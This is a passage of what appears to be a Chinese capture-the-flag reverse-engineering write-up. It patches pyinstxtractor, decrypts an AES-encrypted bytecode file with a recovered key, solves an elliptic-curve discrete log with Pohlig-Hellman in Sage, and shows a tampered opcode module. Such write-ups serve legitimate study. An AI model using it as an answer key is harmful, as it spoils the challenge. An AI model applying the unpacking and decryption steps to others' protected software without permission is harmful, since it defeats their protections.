        x3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (l &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; l &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; other&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; p
        y3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (l &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; x3) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;y) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; p
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; Point(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;curve, x3, y3)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __mul__(self, other):
        e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; other
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;order:
            e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;order
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; g1
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; g1:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; g1
        e3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; e
        negative_self &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Point(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;curve, self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;y, self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;order)
        i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leftmost_bit(e3) &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; result&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;s1()
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; e3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
                result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; result &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; self
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; e3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
                result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; result &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; negative_self
            i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;

        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; result

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __rmul__(self, other):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; self &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; other

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;s1&lt;/span&gt;(self):   &lt;span style=&#34;color:#75715e&#34;&gt;# double函数&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; g1:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; g1
        p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;curve&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p &lt;span style=&#34;color:#75715e&#34;&gt;# 曲线的p&lt;/span&gt;
        a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;curve&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;a &lt;span style=&#34;color:#75715e&#34;&gt;# 曲线的a&lt;/span&gt;
        l &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; a) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; inv_mod(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;y, p) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; p   &lt;span style=&#34;color:#75715e&#34;&gt;# 加法的lambda&lt;/span&gt;
        x3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (l &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; l) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; p                            &lt;span style=&#34;color:#75715e&#34;&gt;# 加法的x_3&lt;/span&gt;
        y3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((l &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; x3)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;y) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; p                    &lt;span style=&#34;color:#75715e&#34;&gt;# 加法的y_3&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; Point(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;curve, x3, y3)


g1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Point(&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)   &lt;span style=&#34;color:#75715e&#34;&gt;# g1是INFINITY&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f3&lt;/span&gt;(var0):
    var1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; var0[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]:
        var1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (var1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; int(i, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; var1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来只需要寻找 &lt;code&gt;from var import *&lt;/code&gt; 中的 &lt;code&gt;var&lt;/code&gt; 即可&lt;/p&gt;
&lt;p&gt;根据pyinstxtractor.py的报错，发现 magic number 和 python3.5 差了1，于是找到报错的位置，将工具对 &lt;code&gt;MAGIC_NUMBER&lt;/code&gt; 的检查去掉&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; pyc_magic &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; pycHeader:
                print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[!] Warning: This script is running in a different Python version than the one used to build the executable.&amp;#39;&lt;/span&gt;)
                print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[!] Please run this script in Python&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{0}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; to prevent extraction errors during unmarshalling&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pyver))
                print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[!] Skipping pyz extraction&amp;#39;&lt;/span&gt;)
                &lt;span style=&#34;color:#75715e&#34;&gt;# return&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用python3.5进行解包，可以得到 &lt;code&gt;var.pyc.encrypt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;手动解密&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; zlib
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; tinyaes

key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;nu1lnu1lnu1lnu1l&amp;#39;&lt;/span&gt;

obj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;var.pyc.encrypted&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()
cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tinyaes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AES(key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(), obj[:&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;])
obj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cipher&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CTR_xcrypt_buffer(obj[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:])

obj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; zlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decompress(obj)

open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;var.pyc&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(obj)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到ECC的曲线和点&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xfffffffffffffffffffffffffffffffeffffac73&lt;/span&gt;
a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xfffffffffffffffffffffffffffffffeffffac71&lt;/span&gt;
b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;

Px &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xf6f8b692899e1b4c5c82580820c2c7cb5597e12e&lt;/span&gt;
Py &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xafb7be2af28b649dab76337b42ee310119413529&lt;/span&gt;

Qx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4945e0d8dc57e88d5949f84bf09943f572dbebb1&lt;/span&gt;
Qy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xb1bf040fe1939c7144341d3af61f36d63f47e272&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上网抄了个sage实现的Pohlig-Hellman进行求解&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xfffffffffffffffffffffffffffffffeffffac73&lt;/span&gt;
a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xfffffffffffffffffffffffffffffffeffffac71&lt;/span&gt;
b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;

P &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0xf6f8b692899e1b4c5c82580820c2c7cb5597e12e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xafb7be2af28b649dab76337b42ee310119413529&lt;/span&gt;)
Q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4945e0d8dc57e88d5949f84bf09943f572dbebb1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xb1bf040fe1939c7144341d3af61f36d63f47e272&lt;/span&gt;)

F &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; FiniteField(p)
E &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; EllipticCurve(F, [a, b])
P &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; E&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;point(P)
Q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; E&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;point(Q)

print(factor(P&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;order()))

primes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4457&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40591&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;585977563&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1460624777797&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5490618741917&lt;/span&gt;]

dlogs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; fac &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; primes:
    t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(P&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;order()) &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; int(fac)
    dlog &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; discrete_log(t&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;Q,t&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;P, operation&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+&amp;#34;&lt;/span&gt;)
    dlogs &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; [dlog]
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;factor: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;str(fac)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;, Discrete Log: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;str(dlog))

crt(dlogs, primes)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到的结果计算十六进制并反转就是最后的flag&lt;/p&gt;
&lt;p&gt;赛后查看了一下官方的WP，发现opcode就在 &lt;code&gt;opcode.pyc&lt;/code&gt; 里面，因为一开始没有解包出来 &lt;code&gt;opcode.pyc&lt;/code&gt; 所以就没有想到这里&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;opcode module - potentially shared between dis and other modules which
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;operate on bytecodes (e.g. peephole optimizers).
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
__all__ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
 &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cmp_op&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hasconst&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hasname&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hasjrel&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hasjabs&amp;#39;&lt;/span&gt;,
 &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;haslocal&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hascompare&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hasfree&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;opname&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;opmap&amp;#39;&lt;/span&gt;,
 &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HAVE_ARGUMENT&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;EXTENDED_ARG&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hasnargs&amp;#39;&lt;/span&gt;]
&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
    &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; _opcode &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; stack_effect
    __all__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;stack_effect&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ImportError&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;

cmp_op &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;=&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;==&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;!=&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt;=&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;in&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;not in&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;is&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;is not&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exception match&amp;#39;&lt;/span&gt;,
          &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BAD&amp;#39;&lt;/span&gt;)
hasconst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
hasname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
hasjrel &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
hasjabs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
haslocal &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
hascompare &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
hasfree &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
hasnargs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
opmap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
opname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
 &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# 这里也改了，应该是 *&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; op &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;):
    opname[op] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (op,)

&lt;span style=&#34;color:#66d9ef&#34;&gt;del&lt;/span&gt; op

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;def_op&lt;/span&gt;(name, op):
    opname[op] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; name
    opmap[name] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; op


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name_op&lt;/span&gt;(name, op):
    def_op(name, op)
    hasname&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(op)


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;jrel_op&lt;/span&gt;(name, op):
    def_op(name, op)
    hasjrel&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(op)


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;jabs_op&lt;/span&gt;(name, op):
    def_op(name, op)
    hasjabs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(op)


def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POP_TOP&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
def_op(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ROT_TWO&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
